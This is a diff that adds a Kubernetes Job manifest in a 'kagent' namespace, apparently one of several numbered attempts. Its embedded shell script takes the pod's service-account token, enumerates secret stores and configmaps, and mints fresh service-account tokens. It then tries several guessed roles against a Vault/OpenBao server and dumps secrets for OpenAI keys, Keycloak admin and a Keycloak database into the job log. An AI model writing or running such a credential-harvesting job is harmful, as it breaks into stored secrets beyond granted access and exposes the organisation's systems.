@@ -1,0 +1,58 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: tmp-i68054-dump8
+  namespace: kagent
+  labels: {tmp: i68054}
+spec:
+  ttlSecondsAfterFinished: 86400
+  backoffLimit: 0
+  template:
+    metadata:
+      labels: {tmp: i68054}
+    spec:
+      serviceAccountName: kagent-tools
+      restartPolicy: Never
+      containers:
+      - name: dump
+        image: alpine:3.20
+        command: ["sh","-c"]
+        args:
+        - |
+          set -u
+          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          K=https://kubernetes.default.svc
+          G() { wget -qO- --no-check-certificate --header="Authorization: Bearer $T" "$1" 2>/dev/null; }
+          echo "===SECTION STORE==="
+          G "$K/apis/external-secrets.io/v1/namespaces/kagent/secretstores/vault-kv"
+          echo; echo "--css--"
+          G "$K/apis/external-secrets.io/v1/clustersecretstores/vault-backend"
+          echo
+          echo "===SECTION CMKAGENT==="
+          G "$K/api/v1/namespaces/kagent/configmaps" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//' | sort -u
+          for c in tmp-i62998-out; do echo "--$c--"; G "$K/api/v1/namespaces/kagent/configmaps/$c"; echo; done
+          echo "===SECTION VAULTTRY==="
+          S=$(G "$K/apis/external-secrets.io/v1/namespaces/kagent/secretstores/vault-kv" | grep -o '"server": "[^"]*"' | head -1 | sed 's/.*: "//;s/"$//')
+          ROLE=$(G "$K/apis/external-secrets.io/v1/namespaces/kagent/secretstores/vault-kv" | grep -o '"role": "[^"]*"' | head -1 | sed 's/.*: "//;s/"$//')
+          echo "server=$S role=$ROLE"
+          [ -z "$S" ] && S=https://openbao.data.atlas-sandbox.public-cloud.social.gouv.fr
+          V() { wget -qO- --no-check-certificate --header="X-Vault-Token: $1" "$2" 2>/dev/null; }
+          for sa in kagent-tools default; do
+            JWT=$(wget -qO- --no-check-certificate --header="Authorization: Bearer $T" --header="Content-Type: application/json" --post-data='{"spec":{}}' "$K/api/v1/namespaces/kagent/serviceaccounts/$sa/token" 2>/dev/null | grep -o '"token": "[^"]*"' | sed 's/.*: "//;s/"$//')
+            echo "--- sa=$sa jwtlen=${#JWT}"
+            for r in "$ROLE" kagent kagent-tools default; do
+              [ -z "$r" ] && continue
+              L=$(wget -qO- --no-check-certificate --header="Content-Type: application/json" --post-data="{\"role\":\"$r\",\"jwt\":\"$JWT\"}" "$S/v1/auth/kubernetes/login" 2>/dev/null)
+              VT=$(echo "$L" | grep -o '"client_token": "[^"]*"' | sed 's/.*: "//;s/"$//')
+              echo "role=$r resp=$(echo "$L" | head -c 120)"
+              if [ -n "$VT" ]; then
+                echo "TOKEN_OK $sa/$r"
+                echo "root-list: $(V "$VT" "$S/v1/k8s-data/metadata?list=true" | head -c 400)"
+                echo "apps-list: $(V "$VT" "$S/v1/k8s-data/metadata/apps?list=true" | head -c 800)"
+                for p in apps/kagent apps/kagent/openai apps/code-amelio/llm apps/keycloak/admin keycloak/db; do
+                  echo "path $p: $(V "$VT" "$S/v1/k8s-data/data/$p" | head -c 400)"
+                done
+              fi
+            done
+          done
+          echo "===SECTION DONE==="
